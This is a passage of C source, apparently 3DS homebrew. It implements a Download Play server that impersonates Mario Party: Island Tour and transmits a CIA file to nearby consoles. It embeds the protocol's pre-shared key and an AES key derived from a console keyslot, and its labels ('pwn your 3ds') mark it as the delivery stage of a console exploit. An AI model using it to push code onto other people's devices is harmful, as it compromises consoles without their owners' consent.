#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>

#include <3ds.h>

#define ECB 0
#define CBC 0
#define CTR 1
#include "aes.h"
#include "dlp.h"
#include "rop.h"

static const char g_DlpUds_PSK[] = "0km@tsa$uhmy1a0sa";
typedef struct _AES128Block {
	u8 data[16];
} AES128Block;

// Following is derived from keyslot 0x39 using:
// KeyID:   B529221CDDB5DB5A1BF26EFF2041E875
// KeySeed: 7462553F9E5A7904B8647CCA736DA1F5
static const AES128Block g_Dlp_KeyNormal = {
	{ 0x89, 0xA7, 0xDE, 0x3B, 0x56, 0xE0, 0x60, 0x63, 0x7B, 0xD7, 0x45, 0x8C, 0x3A, 0x6C, 0xF9, 0xAC }
};
// Following is hardcoded in dlp .rodata
static const AES128Block g_Dlp_CounterSeed = {
	{ 0xFE, 0x44, 0x9A, 0xC1, 0x3A, 0xE3, 0xB4, 0x09, 0x50, 0x11, 0xD1, 0x89, 0x44, 0x10, 0x78, 0x33 }
};

static DlpChecksumSeed dlp_derive_checksum_seed(const udsNetworkStruct* net) {
	// XOR the counter seed with the host MAC address.
	AES128Block dlp_Counter = g_Dlp_CounterSeed;
	for (size_t i = 0; i < sizeof(dlp_Counter.data); i++) {
		dlp_Counter.data[i] ^= net->host_macaddress[i % sizeof(net->host_macaddress)];
	}
	
	// Initialise AES context with the DLP normalkey and the computed counter.
	struct AES_ctx aes;
	AES_init_ctx_iv(&aes, g_Dlp_KeyNormal.data, dlp_Counter.data);
	// Initialise a single AES block to zero, which is also the counter seed.
	union {
		AES128Block block;
		DlpChecksumSeed seed;
	} dlp_SeedBlock = {{{ 0 }}};
	// Crypt that buffer with AES-CTR, using the previously created context (key = DLP normalkey, CTR = seed ^ host MAC address)
	AES_CTR_xcrypt_buffer(&aes, dlp_SeedBlock.block.data, sizeof(dlp_SeedBlock.block.data)); 
	// The seed is the first u32, as big endian.
	dlp_SeedBlock.seed.dword = DLP_HTONL(dlp_SeedBlock.seed.dword);
	return dlp_SeedBlock.seed;
}

static u32 dlp_compute_checksum(const DlpChecksumSeed seed, const void* data, const size_t length) {
	// Initialise the checksum, and get the shift value and iteration count from the seed.
	u32 checksum = 0;
	#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
	u8 shiftVal = 4 + (seed.bytes[1] & 0xf);
	u8 iterations = 2 + (seed.bytes[0] & 0x7);
	#elif __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
	u8 shiftVal = 4 + (seed.bytes[2] & 0xf);
	u8 iterations = 2 + (seed.bytes[3] & 0x7);
	#else
	#error Compiling for an architecture with an unsupported endianness
	#endif
	
	// Cast the buffer pointer to access the data in 32-bit or 8-bit increments.
	const u32* data32 = (u32*)data;
	const u8* data8 = (u8*)data;
	
	// Add each u32 to the checksum (big endian)
	for (size_t i = 0; i < (length / sizeof(u32)); i++) {
		checksum += DLP_HTONL(data32[i]);
	}
	
	// Copy the remaining bytes to a u32, and add that to the checksum (big endian)
	{
		u8 remainder = length % sizeof(u32);
		if (remainder != 0) {
			u32 last32 = 0;
			memcpy(&last32, &data8[length - remainder], remainder);
			checksum += DLP_HTONL(last32);
		}
	}
	
	// Run the shift-xor loop to concatenate the seed into the checksum.
	for (u8 i = 0; i < iterations; i++) {
		checksum = (checksum << shiftVal) | (checksum >> shiftVal);
		checksum ^= seed.dword;
	}
	
	// Return the computed checksum.
	return checksum;
}

typedef struct _DlpConnection {
	u16 nodeId; // UDS node ID for this connection.
	u16 nonce; // Nonce for this connection.
	u8 seq; // Current sequence number.
	u8 type; // ConnectionType.
	u8 lastSent; // Last sent PacketType.
	bool sendingCia; // Remote client wants the CIA to be sent.
	u16 chunk; // CIA chunk currently being sent.
	u16 packet; // CIA packet currently being sent.
	u64 lastSendTime; // OS time (ms) of last packet sent. Set to 0 when the response is received. If a response is not received for 200ms then resent packet.
	bool packets[DLP_CIA_BLOCK_PACKETS]; // CIA packets transferred.
	
	char username[256]; // Username.
	
	DlpMainPacket sent; // Packet last sent.
} DlpConnection;

enum {
	DLPCON_PACKET_MAGIC_UNKNOWN = 0xffff, // Packet number is unknown.
	DLPCON_PACKET_MAGIC_READY = 0xfffe, // Ready to disconnect.
	DLPCON_PACKET_MAGIC_ACKED = 0xfffd, // Acknowledged disconnect.
};

#define PACKET_LENGTH(var, element) (offsetof(__typeof(var), element) + sizeof(var.element))

static void dlp_packet_init_common_with_version(DlpPacketHeader* header, DlpPacketType type, u16 length, DlpProtocolVersion version) {
	header->type = type;
	header->protocolVersion = version;
	header->length = length;
}

static void dlp_packet_init_common(DlpPacketHeader* header, DlpPacketType type, u16 length) {
	dlp_packet_init_common_with_version(header, type, length, PROTOCOL_VERSION_CURRENT);
}

static void dlp_packet_init_main_impl(DlpMainHeader* header, const DlpConnection* connection) {
	// Zero-initialise the unused part of the packet
	memset(header->unused_11, 0, sizeof(header->unused_11));
	header->serverToClient = true;
	header->seq = connection->seq;
	// CIA-chunk packets use nonce zero.
	header->nonce = header->header.type == PACKET_TYPE_TITLE_CHUNK ? 0 : connection->nonce;
	header->connectionType = connection->type;
}

static void dlp_packet_init_main(DlpMainHeader* header, DlpConnection* connection) {
	// Set the last sent type.
	if (header->header.type != PACKET_TYPE_TITLE_CHUNK) connection->lastSent = header->header.type;
	// Initialise the packet.
	dlp_packet_init_main_impl(header, connection);
}

static Result dlp_packet_send_impl(const DlpPacketHeader* header, const DlpConnection* connection, const size_t attempts) {
	Result result;
	for (size_t i = 0; i < attempts; i++) {
		result = udsSendTo(
			connection == NULL ? UDS_BROADCAST_NETWORKNODEID : connection->nodeId,
			header->type == PACKET_TYPE_SPECTATOR ? DATA_CHANNEL_SPECTATOR : DATA_CHANNEL_MAIN,
			UDS_SENDFLAG_Default,
			(void*)header,
			header->length
		);
		
		if (R_SUCCEEDED(result) || UDS_CHECK_SENDTO_FATALERROR(result)) break;
	}
	
	return result;
}

static void dlp_packet_set_checksum(DlpPacketHeader* header, const DlpChecksumSeed seed) {
	header->checksum = 0;
	header->checksum = dlp_compute_checksum(seed, (void*)header, header->length);
}

static bool dlp_packet_verify_checksum(DlpPacketHeader* header, const DlpChecksumSeed seed) {
	u32 expected = header->checksum;
	header->checksum = 0;
	u32 computed = dlp_compute_checksum(seed, (void*)header, header->length);
	header->checksum = expected;
	return expected == computed;
}

static Result dlp_packet_send(DlpPacketHeader* header, DlpConnection* connection, const size_t attempts, const DlpChecksumSeed seed) {
	dlp_packet_set_checksum(header, seed);
	Result result = dlp_packet_send_impl(header, connection, attempts);
	
	// Set the sent information if required.
	if (R_SUCCEEDED(result) && header->type != PACKET_TYPE_TITLE_CHUNK && header->type != PACKET_TYPE_SPECTATOR) {
		connection->lastSendTime = osGetTime();
		connection->sent = *(DlpMainPacket*)header;
	}
	return result;
}

static Result dlp_packet_send_retry(DlpConnection* connection, const size_t attempts) {
	Result result = dlp_packet_send_impl(&connection->sent.header.header, connection, attempts); 
	if (R_SUCCEEDED(result)) connection->lastSendTime = osGetTime();
	return result;
}

typedef struct DLP_IS_BIG_ENDIAN _DlpSpectatorPackets {
	DlpSpectatorPacket initial;
	DlpSpectatorPacket icon[3];
	DlpSpectatorPacket update;
} DlpSpectatorPackets;

static DlpSpectatorPackets g_dlp_spectator_packets = {0};
static DlpConnection g_dlp_connections[UDS_MAXNODES] = {0};

static bool uds_dlp_run(const u8* cia_buffer, const size_t cia_length) {
	size_t cia_chunks_count = (cia_length + DLP_CIA_BLOCK_SIZE - 1) / DLP_CIA_BLOCK_SIZE;
	size_t cia_last_chunk_size = cia_length % DLP_CIA_BLOCK_SIZE;
	size_t cia_last_chunk_packets = (cia_last_chunk_size + DLP_CIA_PACKET_SIZE - 1) / DLP_CIA_PACKET_SIZE;
	udsNetworkStruct net;
	udsBindContext bindctx;
	udsConnectionStatus status;
	for (int i = 0; i < UDS_MAXNODES; i++) {
		g_dlp_connections[i].nodeId = 0;
	}
	udsGenerateDefaultNetworkStruct(&net, 0x2810, 0x55, UDS_MAXNODES);

	printf("Creating the network...\n");
	Result ret = udsCreateNetwork(&net, g_DlpUds_PSK, sizeof(g_DlpUds_PSK), &bindctx, DATA_CHANNEL_MAIN, UDS_DEFAULT_RECVBUFSIZE);
	if(R_FAILED(ret))
	{
		printf("udsCreateNetwork() returned 0x%08x.\n", (unsigned int)ret);
		return false;
	}

	
	memcpy(net.host_macaddress, OS_SharedConfig->wifi_macaddr, sizeof(net.host_macaddress));
	DlpChecksumSeed seed = dlp_derive_checksum_seed(&net);
	
	// Initialise spectator packets.
	{
		memset(&g_dlp_spectator_packets, 0, sizeof(g_dlp_spectator_packets));
		// Initialise packet headers.
		dlp_packet_init_common(&g_dlp_spectator_packets.initial.header.header, PACKET_TYPE_SPECTATOR, offsetof(DlpSpectatorPacket, initial) + sizeof(g_dlp_spectator_packets.initial.initial));
		g_dlp_spectator_packets.initial.header.index = SPECTATOR_INDEX_INITIAL;
		g_dlp_spectator_packets.initial.header.count = sizeof(DlpSpectatorPackets)/sizeof(DlpSpectatorPacket);
		dlp_packet_init_common(&g_dlp_spectator_packets.update.header.header, PACKET_TYPE_SPECTATOR, offsetof(DlpSpectatorPacket, update) + sizeof(g_dlp_spectator_packets.update.update));
		g_dlp_spectator_packets.update.header.index = SPECTATOR_INDEX_UPDATE_FIRST;
		g_dlp_spectator_packets.update.header.count = sizeof(DlpSpectatorPackets)/sizeof(DlpSpectatorPacket);
		for (int i = 0; i < 3; i++ ) {
			dlp_packet_init_common(&g_dlp_spectator_packets.icon[i].header.header, PACKET_TYPE_SPECTATOR, offsetof(DlpSpectatorPacket, icon) + sizeof(g_dlp_spectator_packets.icon[i].icon));
			g_dlp_spectator_packets.icon[i].header.index = SPECTATOR_INDEX_ICON_FIRST + i;
			g_dlp_spectator_packets.icon[i].header.count = sizeof(DlpSpectatorPackets)/sizeof(DlpSpectatorPacket);
		}
		
		// Initialise initial body.
		g_dlp_spectator_packets.initial.initial.titleId = 0x00040001000f8200ull; // mario party island tour EUR
		g_dlp_spectator_packets.initial.initial.titleVersion = 0;
		g_dlp_spectator_packets.initial.initial.allow3d = false;
		g_dlp_spectator_packets.initial.initial.region = CFG_REGION_EUR;
		g_dlp_spectator_packets.initial.initial.chunkSize = DLP_CIA_BLOCK_SIZE;
		g_dlp_spectator_packets.initial.initial.maxPlayerCount = DLP_MAXNODES;
		g_dlp_spectator_packets.initial.initial.cverVariation = 2;
		g_dlp_spectator_packets.initial.initial.cverTitleVersion = 0;
		g_dlp_spectator_packets.initial.initial.updateDisabled = false;
		g_dlp_spectator_packets.initial.initial.ciaTransferSize = cia_length; // is this correct?
		g_dlp_spectator_packets.initial.initial.ciaImportSize = cia_length; // probably not right but whatever
		// copy the short and long descriptions.
		// this needs the asm volatile ("") to prevent compiler optimising the loop to memcpy (which is incorrect because it doesn't swap endianness when required)
		static u16 shortDesc[] = {'p','i','a','l','e','a','s','e',' ','n','e','r','f',0};
		for (int i = 0; i < sizeof(shortDesc); i++) {
			g_dlp_spectator_packets.initial.initial.shortDescription[i] = shortDesc[i];
			asm volatile ("");
		}
		static u16 longDesc[] = {'p','w','n',' ','y','o','u','r',' ','3','d','s',0};
		for (int i = 0; i < sizeof(longDesc); i++) {
			g_dlp_spectator_packets.initial.initial.longDescription[i] = longDesc[i];
			asm volatile ("");
		}
		g_dlp_spectator_packets.initial.initial.cver.major = 1;
		g_dlp_spectator_packets.initial.initial.cver.minor = 3;
		g_dlp_spectator_packets.initial.initial.cver.build = 3;
		g_dlp_spectator_packets.initial.initial.cver.region = '7';
		
		// Initialise update body.
		g_dlp_spectator_packets.update.update.titlesTotal = 0;
		g_dlp_spectator_packets.update.update.titlesCount = 0;
		g_dlp_spectator_packets.update.update.titlesIndex = 0;
		
		// Apply correct checksum to packets.
		dlp_packet_set_checksum(&g_dlp_spectator_packets.initial.header.header, seed);
		dlp_packet_set_checksum(&g_dlp_spectator_packets.update.header.header, seed);
		for (int i = 0; i < 3; i++) {
			dlp_packet_set_checksum(&g_dlp_spectator_packets.icon[i].header.header, seed);
		}
	}
	
	printf("Waiting for connections, press A to stop after send is finished.\n");

	bool finished = false;
	bool hadClients = false;
	size_t specIdx = 0;
	DlpSpectatorPacket* spectators = (DlpSpectatorPacket*)&g_dlp_spectator_packets;
	while(1)
	{
		gspWaitForVBlank();
		hidScanInput();
		u32 kDown = hidKeysDown();
		if (!finished && (kDown & KEY_A)) {
			udsSetNewConnectionsBlocked(true, true, false);
			finished = true;
			printf("Waiting for activity to finish...\n");
		}
		
		// Send the spectator packet.
		if (!finished) {
			dlp_packet_send_impl(&spectators[specIdx].header.header, NULL, DLP_SEND_RETRIES);
			specIdx++;
			if (specIdx >= sizeof(DlpSpectatorPackets)/sizeof(DlpSpectatorPacket)) specIdx = 0;
		}
		
		// Did a new connection occur?
		if (udsWaitConnectionStatusEvent(false, false)) {
			// Get the current connection status.
			ret = udsGetConnectionStatus(&status);
			if(R_FAILED(ret))
			{
				printf("udsGetConnectionStatus() returned 0x%08x.\n", (unsigned int)ret);
				continue;
			}
			
			// for each updated node : unk_xa = bitmask of nodes that were updated, since last call.
			// node 0 is the host (us), sending a malformed packet there won't really do much :)
			for (int i = 0; i < UDS_MAXNODES; i++) {
				if ((status.unk_xa & (1 << i)) == 0) continue; // not updated
				
				u16* nodeTable = (u16*)&status.unk_xc;
				u16 node = nodeTable[i];
				if (node == status.cur_NetworkNodeID) continue; // don't send anything to ourselves
				if (node == 0) {
					// 0 means disconnected
					printf("[%s] Disconnected.\n", g_dlp_connections[i].username);
					g_dlp_connections[i].nodeId = 0; 
					continue;
				}
				
				g_dlp_connections[i].nodeId = node;
				g_dlp_connections[i].nonce = 0;
				g_dlp_connections[i].seq = 0;
				g_dlp_connections[i].type = CONNECTION_UNKNOWN;
				memset(g_dlp_connections[i].packets, 0, sizeof(g_dlp_connections[i].packets));
				
				udsNodeInfo tmpnode;
				ret = udsGetNodeInformation(node, &tmpnode);//This can be used to get the NodeInfo for a node which just connected, for example.
				if(R_FAILED(ret))
				{
					printf("udsGetNodeInformation(%d) returned 0x%08x.\n", node, (unsigned int)ret);
					continue;
				}
				
				// get the username
				memset(g_dlp_connections[i].username, 0, sizeof(g_dlp_connections[i].username));

				ret = udsGetNodeInfoUsername(&tmpnode, g_dlp_connections[i].username);
				if(R_FAILED(ret))
				{
					strcpy(g_dlp_connections[i].username, "<unknown>");
				}
				
				printf("[%s] Sending handshake packet...", g_dlp_connections[i].username);
				DlpMainPacket packet = {0};
				dlp_packet_init_common(&packet.header.header, PACKET_TYPE_HANDSHAKE, offsetof(DlpMainPacket, handshake));
				dlp_packet_init_main_impl(&packet.header, &g_dlp_connections[i]);
				g_dlp_connections[i].lastSent = PACKET_TYPE_HANDSHAKE;
				
				// wait 50ms for client to be ready to accept it
				svcSleepThread(50 * 1000 * 1000);
				ret = dlp_packet_send(&packet.header.header, &g_dlp_connections[i], DLP_SEND_RETRIES, seed);
				if (R_FAILED(ret)) {
					printf("failed:( 0x%08x\n", (unsigned int)ret);
					// try to kick them out
					udsEjectClient(node);
				} else {
					printf("done\n");
				}
			}
		}
		
		// Can a packet be received?
		if (udsWaitDataAvailable(&bindctx, false, false)) {
			do {
				DlpMainPacketBuffer buffer;
				size_t recvLength;
				u16 srcNode;
				ret = udsPullPacket(&bindctx, buffer.data, sizeof(buffer.data), &recvLength, &srcNode);
				// If receive failed, can't do anything.
				if (R_FAILED(ret)) break;
				// If the received length is less than the packet header, this packet is malformed so ignore it.
				if (recvLength < sizeof(buffer.packet.header)) break;
				// If the received length is less than what the packet header says it is, this packet is malformed so ignore it.
				if (recvLength < buffer.packet.header.header.length) break;
				// The length in the packet is trusted now.
				
				static const char * types[] = {
					"",
					"spectator",
					"handshake",
					"wanted titles",
					"title chunk",
					"progress",
					"disconnect"
				};
				// Get the connection from the node id.
				DlpConnection* conn = NULL;
				for (int i = 0; i < UDS_MAXNODES; i++) {
					if (g_dlp_connections[i].nodeId != srcNode) continue;
					conn = &g_dlp_connections[i];
					break;
				}
				if (conn == NULL) break; // should never happen.. but got a crash like this...
				//printf("[%s] Received %s packet (%sseq:%x)\n", conn->username, types[buffer.packet.header.header.type], buffer.packet.header.seq == conn->seq ? "OK" : "NG", buffer.packet.header.seq);
				// Check the nonce, if invalid ignore the packet.
				if (buffer.packet.header.nonce != conn->nonce) break;
				// Check the sequence value, if invalid ignore the packet.
				if (buffer.packet.header.seq != conn->seq) {
					printf("[%s] Bad seq 0x%x on %s packet (wanted 0x%x)\n", conn->username, buffer.packet.header.seq, types[buffer.packet.header.header.type], conn->seq);
					break;
				}
				// Verify the checksum, if invalid then ignore the packet.
				if (!dlp_packet_verify_checksum(&buffer.packet.header.header, seed)) break;
				// Client can't send a server-to-client message, so if we received such a message then ignore it.
				if (buffer.packet.header.serverToClient) {
					printf("[%s] Received bad-request %s packet\n", conn->username, types[buffer.packet.header.header.type]);
					break;
				}
				
				// A valid response to something was received, client incremented the sequence number after the response was sent.
				conn->seq++;
				// Is the type as expected?
				if (buffer.packet.header.header.type != conn->lastSent) {
					printf("[%s] Received incorrect %s (%x) packet\n", conn->username, types[buffer.packet.header.header.type], buffer.packet.header.header.type);
					break;
				}
				// A valid response to the last packet sent was received, zero out the time.
				conn->lastSendTime = 0;
				
				// Now finally look at the packet type and respond to the packet.
				switch (buffer.packet.header.header.type) {
					case PACKET_TYPE_HANDSHAKE:
						// handshake response.
						// Length check.
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + sizeof(buffer.packet.handshake)) break;
						// Set the nonce to the one we received.
						conn->nonce = buffer.packet.handshake.nonce;
						// Connection type here is the one that the client really wants.
						if (buffer.packet.header.connectionType != CONNECTION_CHILD) {
							printf("[%s] Wanted unsupported type %d, kicking them.\n", conn->username, buffer.packet.header.connectionType);
							udsEjectClient(conn->nodeId);
							break;
						}
						conn->type = CONNECTION_CHILD;
						// Send a wanted-titles packet.
						DlpMainPacket request = {0};
						printf("[%s] Sending wanted titles packet...", conn->username);
						dlp_packet_init_common(&request.header.header, PACKET_TYPE_WANTED_TITLES, offsetof(DlpMainPacket, wantedTitles));
						dlp_packet_init_main(&request.header, conn);
						// wait 50ms for client to be ready to accept it
						svcSleepThread(50 * 1000 * 1000);
						ret = dlp_packet_send(&request.header.header, conn, DLP_SEND_RETRIES, seed);
						if (R_FAILED(ret)) {
							printf("failed:( 0x%08x\n", (unsigned int)ret);
							// try to kick them out
							udsEjectClient(conn->nodeId);
						} else {
							printf("done\n");
						}
						break;
					case PACKET_TYPE_WANTED_TITLES:
						// wanted titles response.
						// Length checks.
						//printf("Received wanted-titles from %s with lengths %x %x\n", conn->username, buffer.packet.header.header.length, buffer.packet.wantedTitles.length);
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + offsetof(DlpMainWantedTitlesResponse, bitfield)) {
							//printf("bad header, expected >= %x\n", sizeof(buffer.packet.header) + offsetof(DlpMainWantedTitlesResponse, bitfield));
							break;
						}
						if (buffer.packet.wantedTitles.length > sizeof(buffer.packet.wantedTitles.bitfield)) {
							//printf("bad body, expected <= %x\n", sizeof(buffer.packet.wantedTitles.bitfield));
							break;
						}
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + buffer.packet.wantedTitles.length) {
							//printf("bad header, expected >= %x\n", sizeof(buffer.packet.header) + buffer.packet.wantedTitles.length);
							break;
						}
						// Ensure no other bits OTHER than the bottom bit are set.
						bool invalidTitlesList = false;
						if (buffer.packet.wantedTitles.length != 0 && (buffer.packet.wantedTitles.bitfield[0] & ~1) != 0) {
							invalidTitlesList = true;
						}
						for (int i = 1; i < buffer.packet.wantedTitles.length; i++) {
							if (buffer.packet.wantedTitles.bitfield[i] != 0) invalidTitlesList = true;
						}
						if (invalidTitlesList) {
							printf("User %s wanted unknown titles, kicking them.\n", conn->username);
							udsEjectClient(conn->nodeId);
							break;
						}
						conn->sendingCia = buffer.packet.wantedTitles.length != 0 && (buffer.packet.wantedTitles.bitfield[0] & 1);
						conn->chunk = 0;
						conn->packet = 0;
						memset(conn->packets, 0, sizeof(conn->packets));
						// wait 50ms for client to be ready to accept additional packets
						svcSleepThread(50 * 1000 * 1000);
						if (!conn->sendingCia) {
							printf("[%s] Doesn't want title\n", conn->username);
							// send a progress request
							DlpMainPacket request = {0};
							//printf("Sending progress packet to %s...", conn->username);
							dlp_packet_init_common(&request.header.header, PACKET_TYPE_PROGRESS, offsetof(DlpMainPacket, progressRequest) + sizeof(request.progressRequest));
							dlp_packet_init_main(&request.header, conn);
							request.progressRequest.titleIndex = 0;
							request.progressRequest.chunkIndex = 0;
							ret = dlp_packet_send(&request.header.header, conn, DLP_SEND_RETRIES, seed);
							if (R_FAILED(ret)) {
								printf("[%s] Sending progress request packet failed:( 0x%08x\n", conn->username, (unsigned int)ret);
								// try to kick them out
								udsEjectClient(conn->nodeId);
							}
						} else {
							printf("[%s] Starting transfer.\n", conn->username);
						}
						break;
					case PACKET_TYPE_PROGRESS:
						// progress response.
						// Length check.
						//printf("Received progress from %s with lengths %x %x\n", conn->username, buffer.packet.header.header.length, buffer.packet.progressResponse.length);
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + offsetof(DlpMainProgressResponse, bitfield)) {
							//printf("bad header, expected >= %x\n", sizeof(buffer.packet.header) + offsetof(DlpMainProgressResponse, bitfield));
							break;
						}
						if (buffer.packet.progressResponse.length > sizeof(buffer.packet.progressResponse.bitfield)) {
							//printf("bad body, expected <= %x\n", sizeof(buffer.packet.progressResponse.bitfield));
							break;
						}
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + buffer.packet.progressResponse.length) {
							//printf("bad header, expected >= %x\n", sizeof(buffer.packet.header) + buffer.packet.progressResponse.length);
							break;
						}
						
						if (conn->sendingCia) {
							printf("[%s] Sent progress unexpectedly, kicking them.\n", conn->username);
							udsEjectClient(conn->nodeId);
							break;
						}
						
						if (buffer.packet.progressResponse.status == PROGRESS_COMPLETE) {
							if (buffer.packet.progressResponse.notComplete) {
								if (buffer.packet.progressResponse.titleIndex != 0) {
									printf("[%s] Wants another CIA, kicking them.\n", conn->username);
									udsEjectClient(conn->nodeId);
									break;
								}
								if (buffer.packet.progressResponse.chunkIndex >= cia_chunks_count) {
									printf("[%s] Request beyond EOF, kicking them.\n", conn->username);
									udsEjectClient(conn->nodeId);
									break;
								}
								u8 percent = (u8)( (((float)buffer.packet.progressResponse.chunkIndex) / ((float)cia_chunks_count)) * 100.0f );
								printf("[%s] Transfer at %d%%\n", conn->username, percent);
								memset(conn->packets, 0, sizeof(conn->packets));
								conn->chunk = buffer.packet.progressResponse.chunkIndex;
								conn->packet = 0;
								conn->sendingCia = true;
								break;
							}
							
							// don't send anything yet, following code will send disconnect to everyone
							printf("[%s] Transfer complete.\n", conn->username);
							conn->packet = DLPCON_PACKET_MAGIC_READY;
							break;
						}
						
						if (buffer.packet.progressResponse.status == PROGRESS_IGNORE) {
							// user doesn't want this cia, so don't bother
							break;
						}
						
						if (buffer.packet.progressResponse.status != PROGRESS_RETRY) {
							printf("[%s] Sent unknown progress status %d, kicking them.\n", conn->username, buffer.packet.progressResponse.status);
							udsEjectClient(conn->nodeId);
							break;
						}
						
						if (buffer.packet.progressResponse.chunkIndex >= cia_chunks_count) {
							printf("[%s] Requests beyond EOF, kicking them.\n", conn->username);
							udsEjectClient(conn->nodeId);
							break;
						}
						
						size_t bit = 0;
						// Set the next chunk/packets data to match what was sent.
						memset(conn->packets, 0, sizeof(conn->packets));
						conn->chunk = buffer.packet.progressResponse.chunkIndex;
						conn->packet = DLPCON_PACKET_MAGIC_UNKNOWN;
						for (int i = 0; i < buffer.packet.progressResponse.length; i++) {
							u8 value = buffer.packet.progressResponse.bitfield[i];
							for (int j = 0; j < 8; j++) {
								if (bit < sizeof(conn->packets)) {
									// we store packet WAS transferred; they send packet NEEDS transferring
									conn->packets[bit] = (value & 1) == 0;
									if (conn->packet == DLPCON_PACKET_MAGIC_UNKNOWN && !conn->packets[bit]) conn->packet = bit;
								}
								value >>= 1;
								bit++;
							}
							if (bit >= sizeof(conn->packets)) break;
						}
						if (conn->packet == DLPCON_PACKET_MAGIC_UNKNOWN) {
							conn->packet = 0;
						}
						conn->sendingCia = true;
						break;
					case PACKET_TYPE_DISCONNECT:
						// disconnect response.
						// Length check.
						if (buffer.packet.header.header.length < sizeof(buffer.packet.header) + sizeof(buffer.packet.disconnectResponse)) break;
						
						if (conn->sendingCia) {
							printf("[%s] Sent disconnect unexpectedly, kicking them.\n", conn->username);
							udsEjectClient(conn->nodeId);
							break;
						}
						
						if (buffer.packet.disconnectResponse.operation != OPERATION_START_CHILD) {
							printf("[%s] Sent unknown disconnect status %d, kicking them.\n", conn->username, buffer.packet.disconnectResponse.operation);
							udsEjectClient(conn->nodeId);
							break;
						}
						
						// do nothing, we're about to disconnect anyways.
						conn->packet = DLPCON_PACKET_MAGIC_ACKED;
						hadClients = true;
						break;
				}
			} while (false);
		}
		
		// Loop through all connected clients and perform any needed operations.
		bool hasConnections = false;
		bool allDone = true;
		bool stillSending = false;
		
		for (int i = 0; i < UDS_MAXNODES; i++) {
			DlpConnection* conn = &g_dlp_connections[i];
			
			if (conn->nodeId == 0) continue;
			hasConnections = true;
			
			if (conn->lastSendTime != 0) {
				// Haven't received a response to the last packet sent yet.
				if ((osGetTime() - conn->lastSendTime) >= DLP_TIME_TO_WAIT_FOR_RESPONSE) {
					// Resend the packet.
					ret = dlp_packet_send_retry(conn, DLP_SEND_RETRIES);
					if (R_FAILED(ret)) {
						printf("[%s] Retry packet send failed:( 0x%08x\n", conn->username, (unsigned int)ret);
						// try to kick them out
						udsEjectClient(conn->nodeId);
					}
				}
			}
			
			if (conn->packet != DLPCON_PACKET_MAGIC_ACKED) {
				allDone = false;
			}
			if (conn->packet != DLPCON_PACKET_MAGIC_READY) {
				// At least one client is still being sent the CIA, can't disconnect everyone yet.
				stillSending = true;
			}
			if (conn->sendingCia) {
				// we need to send our next packet.
				
				DlpMainPacket request = {0};
				size_t packetCount = sizeof(conn->packets);
				if (conn->chunk == (cia_chunks_count - 1)) packetCount = cia_last_chunk_packets;
				if (conn->packet >= packetCount) {
					// finished this chunk.
					conn->sendingCia = false;
					dlp_packet_init_common(&request.header.header, PACKET_TYPE_PROGRESS, offsetof(DlpMainPacket, progressRequest) + sizeof(request.progressRequest));
					dlp_packet_init_main(&request.header, conn);
					request.progressRequest.titleIndex = 0;
					request.progressRequest.chunkIndex = conn->chunk;
					ret = dlp_packet_send(&request.header.header, conn, DLP_SEND_RETRIES, seed);
					if (R_FAILED(ret)) {
						printf("[%s] Sending progress request packet failed:( 0x%08x\n", conn->username, (unsigned int)ret);
						// try to kick them out
						udsEjectClient(conn->nodeId);
					}
				} else {
					// send this chunk.
					dlp_packet_init_common(&request.header.header, PACKET_TYPE_TITLE_CHUNK, offsetof(DlpMainPacket, titleChunk) + sizeof(request.titleChunk));
					dlp_packet_init_main(&request.header, conn);
					request.titleChunk.titleIndex = 0;
					request.titleChunk.chunkIndex = conn->chunk;
					request.titleChunk.packetOffset = conn->packet;
					size_t offset = (conn->chunk * DLP_CIA_BLOCK_SIZE) + (conn->packet * sizeof(request.titleChunk.data));
					size_t length = sizeof(request.titleChunk.data);
					if ((cia_length - offset) < length) length = (cia_length - offset);
					request.titleChunk.length = length;
					memcpy(request.titleChunk.data, &cia_buffer[offset], length);
					ret = dlp_packet_send(&request.header.header, conn, DLP_SEND_RETRIES, seed);
					if (R_FAILED(ret)) {
						printf("[%s] Sending CIA packet failed:( 0x%08x\n", conn->username, (unsigned int)ret);
						// try to kick them out
						udsEjectClient(conn->nodeId);
					} else {
						conn->packets[conn->packet] = true;
						while (conn->packets[conn->packet]) {
							conn->packet++;
							if (conn->packet >= sizeof(conn->packets)) break;
						}
					}					
				}
			}
		}
		
		// If every player has finished the transfer: (this will start dlp child on everyone so only do it when we're finishing)
		if (finished && hasConnections && !stillSending) {
			for (int i = 0; i < UDS_MAXNODES; i++) {
				DlpConnection* conn = &g_dlp_connections[i];
			
				if (conn->nodeId == 0) continue;
				if (conn->lastSent == PACKET_TYPE_DISCONNECT) continue;
				
				// Send a disconnect packet.
				DlpMainPacket request = {0};
				printf("[%s] Sending disconnect packet...", conn->username);
				dlp_packet_init_common(&request.header.header, PACKET_TYPE_DISCONNECT, offsetof(DlpMainPacket, disconnectRequest) + sizeof(request.disconnectRequest));
				dlp_packet_init_main(&request.header, conn);
				request.disconnectRequest.operation = OPERATION_START_CHILD;
				// Send a hardcoded PSK for the next stage.
				// It is required to send 8 bytes + null terminator (UDS PSK must be a minimum of 8 bytes long).
				// Use the first 8 bytes of the constant DLP PSK, and null terminate it.
				// This is: "0km@tsa$"
				memcpy(request.disconnectRequest.udsPsk, g_DlpUds_PSK, sizeof(request.disconnectRequest.udsPsk) - 1);
				request.disconnectRequest.udsPsk[sizeof(request.disconnectRequest.udsPsk) - 1] = 0;
				// Mario Party: Island Tour does something really stupid and uses the last char of the PSK as a state-enum.
				// So we need to set that too...
				request.disconnectRequest.udsPsk[sizeof(request.disconnectRequest.udsPsk) - 2] = 'v';
				ret = dlp_packet_send(&request.header.header, conn, DLP_SEND_RETRIES, seed);
				if (R_FAILED(ret)) {
					printf("failed:( 0x%08x\n", (unsigned int)ret);
					// try to kick them out
					udsEjectClient(conn->nodeId);
				} else {
					printf("done\n");
				}
			}
			continue;
		}
		
		if (finished && (allDone || !hasConnections)) break;
	}

	printf("Disabling the network...\n");
	// wait 50ms before killing the network. if the network is killed "too fast" then dlp:CLNT/dlp:FKCL GetWirelessRebootPassphrase will error
	svcSleepThread(50 * 1000 * 1000);
	udsDestroyNetwork();
